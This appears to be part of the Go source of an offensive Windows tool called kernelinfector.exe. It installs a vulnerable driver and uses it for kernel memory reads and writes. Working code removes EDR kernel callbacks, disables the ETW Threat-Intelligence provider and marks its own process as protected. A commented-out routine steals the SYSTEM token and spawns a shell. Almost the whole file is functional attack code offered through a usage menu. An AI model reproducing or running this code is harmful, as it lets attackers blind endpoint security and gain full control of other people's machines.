	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
	etwThreatIntProviderEnableInfoAddress := getEtwThreatIntProviderEnableInfoAddress(&ntoskrnlOffsets)

	if etwThreatIntProviderEnableInfoAddress == 0 {
		return state
	}
	device := getDriverHandle()
	etwThreatIntProviderEnableInfoValue := readMemoryBYTE(device, etwThreatIntProviderEnableInfoAddress)
	CloseHandle(device)
	state = etwThreatIntProviderEnableInfoValue == 0x1 //0x1 means ENABLE_PROVIDER
	return state
}

func getEPROCESSAddress() uintptr {
	pID := uint32(os.Getpid()) //os.Getpid()
	pHandle, err := windows.OpenProcess(windows.SYNCHRONIZE, false, pID)
	if err != nil {
		panic(err)
	}
	defSize := uint32(0x800000)
	tmpSysHandleInfo := make([]byte, defSize)
	sysHandleTableEntryInfoSize := int(unsafe.Sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO{}))
	var sysHandleInfo SYSTEM_HANDLE_INFORMATION
	var retSize uint32
	status := windows.NtQuerySystemInformation(0x10, unsafe.Pointer(&tmpSysHandleInfo[0]), defSize, &retSize)
	if status != nil {
		if uint32(status.(windows.NTStatus)) == 0xc0000004 {
			overSize := retSize * 2
			tmpSysHandleInfo = make([]byte, overSize)
			status = windows.NtQuerySystemInformation(0x10, unsafe.Pointer(&tmpSysHandleInfo[0]), overSize, &overSize)
			if status != nil {
				fmt.Println(status)
				return 0
			}
		} else {
			fmt.Println(status)
			return 0
		}
	}
	byteSysHandleInfo := tmpSysHandleInfo[:retSize]
	sysHandleInfoCount := *(*uint32)(unsafe.Pointer(&byteSysHandleInfo[0]))
	sysHandleInfo.NumberOfHandles = sysHandleInfoCount

	sysHandleInfo.Handles = make([]SYSTEM_HANDLE_TABLE_ENTRY_INFO, sysHandleInfoCount)
	for i := 0; i < int(sysHandleInfoCount); i++ {
		sysHandleInfo.Handles[i] = *(*SYSTEM_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&byteSysHandleInfo[8+(sysHandleTableEntryInfoSize*i)]))
	}
	//sysHandleInfo.Handles = (*(*[0x1000000]SYSTEM_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&byteSysHandleInfo[8])))[:]

	println(sysHandleInfo.Handles)
	for i := 0; i < int(sysHandleInfo.NumberOfHandles); i++ {
		handle := sysHandleInfo.Handles[i]
		if handle.UniqueProcessId != uint16(pID) {
			continue
		}
		fmt.Printf("[*] Handle for the current process (PID: %d): 0x%x at 0x%x debug handle:%x\n", pID, handle.HandleValue, handle.Object, pHandle)
		if handle.HandleValue == uint16(uintptr(pHandle)) {
			fmt.Printf("[+] Found the handle of the current process (PID: %d): 0x%x at 0x%x\n", pID, handle.HandleValue, handle.Object)
			return handle.Object
		}
	}
	windows.CloseHandle(pHandle)
	return 0
}

func setProcessAsProtected() {
	device := getDriverHandle()

	ntoskrnlOffsets := getNtoskrnlVersion()
	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
	if ntoskrnlVersion == "" {
		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
		return
	}
	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)

	processEPROCESSAddress := getEPROCESSAddress()
	processSignatureLevelAddress := DWORD64(processEPROCESSAddress + uintptr(ntoskrnlOffsets.psProtection))

	writeMemoryWORD(device, processSignatureLevelAddress, 0x61)
	CloseHandle(device)
}

/*
//PPLKiller
func makeSystem() {
	cpid := DWORD64(os.Getpid())
	offsets := getVersionOffsets()
	device := getDriverHandle()
	addr1 := getFunctionAddress("PsInitialSystemProcess")
	addr2 := readMemoryDWORD64(device, addr1)
	fmt.Printf("[*] PsInitialSystemProcess address: %x\n", addr2)

	//get system process token
	token := readMemoryDWORD64(device, addr2+offsets.TokenOffset) &^ 15
	fmt.Printf("[*] System process token: %x\n", token)

	processHead := addr2 + offsets.ActiveProcessLinksOffset
	currentProcessAddress := processHead
	for {
		processAddress := currentProcessAddress - offsets.ActiveProcessLinksOffset
		uniqueProcessId := readMemoryDWORD64(device, processAddress+offsets.UniqueProcessIdOffset)
		if uniqueProcessId == cpid {
			break
		}
		currentProcessAddress = readMemoryDWORD64(device, processAddress+offsets.ActiveProcessLinksOffset)
		if currentProcessAddress == processHead {
			break
		}
	}
	currentProcessAddress -= offsets.ActiveProcessLinksOffset
	fmt.Printf("[*] Current process address: %x\n", currentProcessAddress)

	currentProcessFastToken := readMemoryDWORD64(device, currentProcessAddress+offsets.TokenOffset)
	currentProcessTokenReferenceCounter := currentProcessFastToken & 15
	currentProcessToken := currentProcessFastToken &^ 15
	fmt.Printf("[*] Current process token: %x\n", currentProcessToken)
	fmt.Println("[*] Stealing System process token ...")
	writeMemoryDWORD64(device, currentProcessAddress+offsets.TokenOffset, currentProcessTokenReferenceCounter|token)
	CloseHandle(device)

	fmt.Println("[*] Spawning new shell ...")
	cmd := exec.Command("c:\\windows\\system32\\cmd.exe")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	_ = cmd.Run()
}

*/
func main() {

	usage := "Usage: kernelinfector.exe OPTION\n/proc - List Process Creation Callbacks\n/delproc <address> - Remove Process Creation Callback"
	getNtoskrnlVersion()
	if len(os.Args) < 2 {
		fmt.Println(usage)
	} else if os.Args[1] == "/enum" {
		enumAllEDRKernelCallbacks()
		if isETWThreatIntelProviderEnabled() {
			fmt.Println("Enabled!!!!!!!!")
		}
		//findProcessCallbackRoutine("")
	} else if os.Args[1] == "/deproc" && len(os.Args) == 3 {
		//r := os.Args[2]
		//findProcessCallbackRoutine(r)
	} else if os.Args[1] == "/removeall" {
		removeAllEDRKernelCallbacks()
		ntoskrnlOffsets := getNtoskrnlVersion()
		changeStatusETWThreatIntelProvider(&ntoskrnlOffsets, false)
		//makeSystem()
	} else if os.Args[1] == "/install" {
		installVulnDriver()
	} else if os.Args[1] == "/uninstall" {
		uninstallVulnDriver()
	} else if os.Args[1] == "/test" {
		//setProcessAsProtected()
		getEPROCESSAddress()
		bufio.NewScanner(os.Stdin).Scan()
		time.Sleep(100000)
	} else {
		fmt.Println(usage)
	}

	//CSV output
	//CSV import
}
